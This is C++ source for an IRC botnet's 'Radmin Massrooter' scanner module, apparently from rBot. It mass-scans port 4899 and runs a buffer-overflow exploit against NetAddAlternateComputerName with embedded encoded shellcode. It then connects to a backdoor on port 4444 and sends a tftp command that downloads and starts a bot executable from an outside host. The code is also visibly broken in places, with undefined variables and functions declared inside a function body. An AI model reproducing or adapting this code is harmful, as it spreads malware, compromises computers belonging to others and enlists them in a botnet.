/*

  Title: Radmin Massrooter
  Author: Nils <nils@rBot.org
  Comments: I know, sorry, the code looks kinda fucked up. ;-)

 */

#include "main.h"
#include "radminscanner.h"
#include "mainctrl.h"
#include "utility.h"
#include "shellcode.h"

#include <windows.h>
#include <process.h>
#pragma comment(lib, "ws2_32.lib")

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <time.h>

#define ThreadsCount 1
#define TCP_PORT 4899

typedef int (__stdcall *MyNVN)(LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, ULONG);
typedef int (__stdcall *MyNAACN)(LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, ULONG);

CScannerRADMIN::CScannerRADMIN() { m_sScannerName.Assign("radmin"); }
void CScannerRADMIN::StartScan(const CString &sHost)
{	bool bSuccess=false;
#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(4, "%s scanning IP: %s:4899\n " , m_sScannerName.CStr(), sHost.CStr());
#endif // DBGCONSOLE
#ifdef WIN32
	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning ip: %s:4899.", m_sScannerName.CStr(), sHost.CStr());
	if(ScanPort(sHost.CStr(), 4899))
	{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: found open port: %s:4899.", m_sScannerName.CStr(), sHost.CStr());
		bSuccess=Exploit(sHost); }
#endif

	// Success
	if(bSuccess) {
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"%s: exploited ip: %s", m_sScannerName.CStr(), sHost.CStr());
		m_pScanner->m_iRADMINStats++;}
	}

bool CScannerRADMIN::ExploitNP(const CString &sHost)
{
	return false;
}

bool CScannerRADMIN::Exploit(const CString &sHost) {
     int attack(char *sHost);
     int AttemptConnect(int tm, int port, const char* sHost);
     void DoCheckOpen(char *sHost);
     int DownloadOn=0;
     char cmd[500];
     int ThreadsInUse=0;

     if(DownloadOn)
	{
		_snprintf(cmd,sizeof(cmd),
			"tftp -i bla.rrr.th get test.exe"
			"&start bot.exe&wank\n");
	}

typedef VOID (*MYPROC)(IN  LPCWSTR Server OPTIONAL,
    IN  LPCWSTR AlternateName,
    IN  LPCWSTR DomainAccount OPTIONAL,
    IN  LPCWSTR DomainAccountPassword OPTIONAL,
    IN  ULONG Reserved
    );

char sc[] = 

	"\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"
    "\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"
    "\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"
    "\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"
    "\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"
    "\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"
    "\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"
    "\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\xdd\x5a\x60\xdf\xda\x8a\x81"
    "\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"
    "\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"
    "\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"
    "\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"
    "\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"
    "\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"
    "\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"
    "\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"
    "\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"
    "\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"
    "\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"
    "\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"
    "\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"
    "\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"
    "\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"
    "\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"
    "\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"
    "\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"
    "\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"
    "\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"
    "\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"
    "\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"
    "\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"
    "\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04";

void CScannerRADMIN::DoCheckOpen(char *sHost)
{
	unsigned int sock;

		if(!((sock=AttemptConnect(3, ScanPort, sHost))==-1))
		{
            g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), " [+] Attempting to infect: %s\n",sHost.CStr());
			attack(sHost);
		}
		closesocket(sock);
		free(sHost);
}

int CScannerRADMIN::AttemptConnect(int tm, int ScanPort, const char* sHost)
{
	unsigned int sock;
	unsigned long y = 1;
	struct timeval timeout;
	struct sockaddr_in target_ip;

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
		return -1;

    target_ip.sin_family = AF_INET;
    target_ip.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
    // ^ Server's address
    target_ip.sin_port = htons(TCP_PORT);

	ioctlsocket(sock,FIONBIO,&y);

	timeout.tv_sec=tm;
	timeout.tv_usec = 0;

	if (connect(sock, (struct sockaddr *)&target_ip, sizeof(target_ip)) == -1) 
	{
		fd_set writefds;
		fd_set exceptfds;

		FD_ZERO (&writefds);
		FD_ZERO (&exceptfds);
		FD_SET (sock, &writefds);
		FD_SET (sock, &exceptfds);

		select (0, NULL, &writefds, &exceptfds, &timeout);  

		if (!FD_ISSET (sock, &writefds)) 
		{
				closesocket(sock);
			return -1;
		}
		y=0;
		ioctlsocket(sock,FIONBIO,&y);
	}
	return sock;
}

int CScannerRADMIN::attack(char *sHost)
{
	SOCKET sock;
	char overwrite[2045] = "";
	char exp_buf[2045+4+16+501];
	char ip[30];
	LPWSTR ipl[60];
	DWORD jmpesp = 0x7518A747;
	LPWSTR unicodesp0[(2045+4+16+501)*2];
	char unicode[(2045+4+16+501)*2];
	int i = 0;
	int x = 0;
	int len = 0;
	HINSTANCE hinstLib; 
    MYPROC ProcAddr; 
    BOOL fFreeResult, fRunTimeLinkSuccess = FALSE; 

	_snprintf(ip, 24, "\\\\%s", sHost); // i should've used vsprintf() >:)

	hinstLib = LoadLibrary("netapi32.dll");
	
	memset(overwrite, 0x41, 2000);
	memset(overwrite+2000, 0x90, 44);
	memcpy(exp_buf, overwrite, 2044);
	memcpy(exp_buf+2044, &jmpesp, 4);
	memset(exp_buf+2048, 0x90, 16);
	memcpy(exp_buf+2064, sc, sizeof(sc));
	if(spOne) {
		memset(unicode, 0x00, sizeof(unicode));
		for (x = 0, i = 0; i <= sizeof(unicode); x++, i+=2) { // roll my own; stupid multibytetosuck broke my string. 
			unicode[i] = exp_buf[x];						  // my thanks goes to dave aitel for mentioning this to me.
		}
	} else {
		len = MultiByteToWideChar(CP_ACP, NULL, exp_buf, sizeof(exp_buf), (unsigned short *)unicodesp0,sizeof(unicodesp0));
	}
	MultiByteToWideChar(CP_ACP, NULL, ip, 30, (unsigned short*)ipl, 60);
	
	if (hinstLib != NULL) {
		ProcAddr = (MYPROC) GetProcAddress(hinstLib,"NetAddAlternateComputerName");
		if (NULL != ProcAddr) {
            fRunTimeLinkSuccess = TRUE;	
			if (spOne) {
				(ProcAddr)((LPCWSTR)ipl,(const unsigned short *)unicode,NULL,NULL,0);
			} else {
				(ProcAddr)((LPCWSTR)ipl,(const unsigned short *)unicodesp0,NULL,NULL,0);
			}
		} else {
            g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[*] procaddr null: \n");
		}
 
        fFreeResult = FreeLibrary(hinstLib); 
    } 

	if(DownloadOn==1) 
	{
		if((sock=AttemptConnect(3, 4444, sHost))!=-1)
		{
			send(sock, cmd, strlen(cmd), 0);

              g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), " [+] Connected to backdoor: %s\n",sHost.CStr());

			unsigned int nReadBytes;
			char received[1000];

			while(1)
			{
				Sleep(1000);

				unsigned long ul[2];
				ul[0]=1;
				ul[1]=sock;

				struct timeval timeout;

				timeout.tv_sec=1;
                timeout.tv_usec=0;

				int l=select(0, (fd_set *)&ul, 0,0, &timeout);

				if ((l==1))
				{
					if((nReadBytes = recv(sock, received, sizeof(received), 0))!= SOCKET_ERROR && nReadBytes!=0)
					{
						received[nReadBytes]=0x00;

						if(strstr(received, "not recognized"))
							break;
					}
				}
			}
		}
	}
	else 
	{
		Sleep(1000);
              g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), " [+] Server exploited: %s\n",sHost.CStr());
	}
	closesocket(sock);
	return (0);
}
}
